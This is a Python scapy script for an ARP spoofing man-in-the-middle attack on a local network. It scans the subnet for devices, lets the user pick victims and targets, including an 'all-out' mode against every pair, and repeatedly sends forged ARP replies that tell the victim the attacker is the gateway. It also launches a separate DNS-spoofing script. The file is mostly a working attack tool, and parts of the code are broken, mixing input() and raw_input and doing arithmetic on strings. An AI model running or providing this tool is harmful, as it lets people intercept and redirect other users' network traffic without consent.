from scapy.all import *
import time
import socket
import netifaces
import netifaces as ni

#set up functions for finding the network interface
def get_default_gateway_ip():
    gateways = ni.gateways()
    default_gateway = gateways['default']
    if default_gateway and len(default_gateway) > 0:
        return default_gateway[ni.AF_INET][0]
    return None

def get_local_ip_and_interface(default_gateway_ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((default_gateway_ip, 0))
        local_ip = sock.getsockname()[0]
       
        interfaces = ni.interfaces()
        for interface in interfaces:
            addresses = ni.ifaddresses(interface)
            if ni.AF_INET in addresses:
                ip_address = addresses[ni.AF_INET][0]['addr']
                if ip_address == local_ip:
                    return local_ip, interface
        return local_ip, None
    except socket.error:
        return None, None
#print for user
print("Starting the script ...")

# Get the default gateway IP address
default_gateway_ip = get_default_gateway_ip()

# Get the local IP address and network interface on the same network as the default gateway
local_ip, network_interface = get_local_ip_and_interface(default_gateway_ip)

# Print the local IP address and network interface
if local_ip and network_interface:
    print("Default Network Interface: {}".format(network_interface))
else:
    print("Local IP address and network interface not found.")

#show interfaces to user and let them pick one
print("All network interfaces:")
interfaces = netifaces.interfaces()
print(interfaces)
print("pick the network you want to spoof")
number = input('number of network:')
print("you chose: {}".format(interfaces[number-1]))

network = str(interfaces[number-1])
print(network)

#get my own ip and mac from the network
myIp = get_if_addr(network)
myMac = get_if_hwaddr(network)

#create ipRange over entire network
ipRange = myIp.rsplit('.', 1)[0] + ".1/24"

#create arp broadcast to find all connected devices
arp = ARP(pdst=ipRange)
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
packet = ether/arp

responses = srp(packet, timeout=3, iface=network)[0]
devices = []
for sent, received in responses:
    if (received.psrc != myIp):
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

#show all devices in network and let user decide what to spoof
print("devices in the network")
print("ip" + " "*18+"MAC")
for device in devices:
    print("{:16} {}".format(device['ip'], device['mac']))

print("choose an ip of a victim to spoof, 0: spoof everything")
victim = input("Choose the ip to spoof:")-1
spoofPacket = []

#Store the victim IP for dns script
victimIP = devices[victim]['ip']

#case 1: all out mode
if (victim == -1):
    print("you choose: all-out-mode")
    for device1 in devices:
        for device2 in devices:
            if (device1 != device2):
                arp = Ether() / ARP ()
                arp[Ether].src = myMac
                arp[ARP].hwsrc = myMac
                arp[ARP].psrc = device2['ip']
                arp[ARP].hwdst = device1['mac']
                arp[ARP].pdst = device1['ip']
                spoofPacket.append(arp)

#case 2: silent mode (i.e 1 victim)
else:
    print("you choose {}".format(devices[victim]))
    attack = input("Attack: ")
    
    print("now choose a target device to pretend to be for the victim")
    print("0: target all devices")
    target = input("number of target ip: (Target gateway for DNS attack - 1)")-1
    #case 2a: one victim but MITM for all other devices on the network
    if (target == -1):
        for deviceTarget in devices:
            if (deviceTarget != devices[victim]):
                arp = Ether() / ARP ()
                arp[Ether].src = myMac
                arp[ARP].hwsrc = myMac
                arp[ARP].psrc = deviceTarget['ip']
                arp[ARP].hwdst = devices[victim]['mac']
                arp[ARP].pdst = devices[victim]['ip']
                spoofPacket.append(arp)
                arp = Ether() / ARP ()
                arp[Ether].src = myMac
                arp[ARP].hwsrc = myMac
                arp[ARP].psrc = devices[victim]['ip']
                arp[ARP].hwdst = deviceTarget['mac']
                arp[ARP].pdst = deviceTarget['ip']
                spoofPacket.append(arp)
    #case 2b: one victim but MITM for one target device on the network
    else:
        #IP address to direct to
        targetIP = raw_input("Enter IP address to direct to: ")
        arp = Ether() / ARP ()
        #source
        arp[Ether].src = myMac
        arp[ARP].hwsrc = myMac
        arp[ARP].psrc = devices[target]['ip']   #Gateway IP
        #destination
        arp[ARP].hwdst = devices[victim]['mac']
        arp[ARP].pdst = devices[victim]['ip']
        #Telling victim, we are gateway
        spoofPacket.append(arp)
        
        arp = Ether() / ARP ()
        arp[Ether].src = myMac
        arp[ARP].hwsrc = myMac
        arp[ARP].psrc = devices[victim]['ip']
        arp[ARP].hwdst = devices[target]['mac'] #Gateway MAC
        arp[ARP].pdst = devices[target]['ip']   #Gateway IP
         #Telling gateway, we are victim
        spoofPacket.append(arp)

        #call dns script 
        subprocess.Popen(["python", "dns.py", str(network), str(victimIP), str(targetIP)])
    

#send the packets for the attack
while True:
    for packet in spoofPacket:
        sendp(packet, iface=network)

    time.sleep(3)
